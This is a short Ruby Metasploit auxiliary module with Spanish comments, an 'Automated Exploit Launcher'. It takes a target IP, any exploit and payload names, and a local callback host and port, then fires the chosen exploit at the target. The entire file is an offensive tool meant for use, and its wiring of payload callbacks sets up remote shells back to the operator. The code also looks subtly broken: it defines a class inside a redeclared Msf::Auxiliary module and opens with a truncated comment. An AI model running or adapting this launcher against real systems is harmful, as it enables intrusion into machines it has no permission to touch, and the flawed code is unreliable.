require 'msf/core'

module Msf
	module Auxiliary
		class AutomatedExploitLauncher < Msf::Auxiliary
			# la descripción y el autor.
			def initialize
				super(
					'Name' => 'Automated Exploit Launcher',
					'Description' => 'Lanza automáticamente un exploit y payload especificados contra un sistema objetivo.',
					'Author' => ['Miguel22247'],
					'License' => MSF_LICENSE
				)

				# Opciones del módulo
				register_options(
					[
						Opt::RHOST(),
						OptString.new('EXPLOIT', [true, 'Nombre del módulo exploit a usar']),
						OptString.new('PAYLOAD', [true, 'Nombre del payload a usar']),
						OptString.new('LHOST', [true, 'IP local para el payload']),
						OptInt.new('LPORT', [true, 'Puerto local para el payload', 4444])
					]
				)
			end

			def run
				# Obtener parámetros del datastore
				target_ip = datastore['RHOST']
				exploit_name = datastore['EXPLOIT']
				payload_name = datastore['PAYLOAD']
				lhost = datastore['LHOST']
				lport = datastore['LPORT']

				# Cargar y configurar el exploit:
				print_status("Lanzando exploit #{exploit_name} contra #{target_ip} con payload #{payload_name}")

				begin
					# Cargar el módulo exploit
					exploit = framework.exploits.create(exploit_name)
					if exploit.nil?
						print_error("No se pudo cargar el módulo exploit: #{exploit_name}")
						return
					end

					# Configurar el exploit
					exploit.datastore['RHOST'] = target_ip

					# Cargar y configurar el payload:
					payload = framework.payloads.create(payload_name)
					if payload.nil?
						print_error("No se pudo cargar el payload: #{payload_name}")
						return
					end

					# Configurar el payload
					payload.datastore['LHOST'] = lhost
					payload.datastore['LPORT'] = lport

					# Configurar y ejecutar el exploit
					exploit.datastore['PAYLOAD'] = payload.name
					print_status("Ejecutando exploit...")
					exploit.exploit_simple(
						'Payload' => payload,
						'LocalInput' => framework.input,
						'LocalOutput' => framework.output
					)
				rescue => e
					print_error("Error al ejecutar el exploit: #{e.message}")
				end
			end
		end
	end
end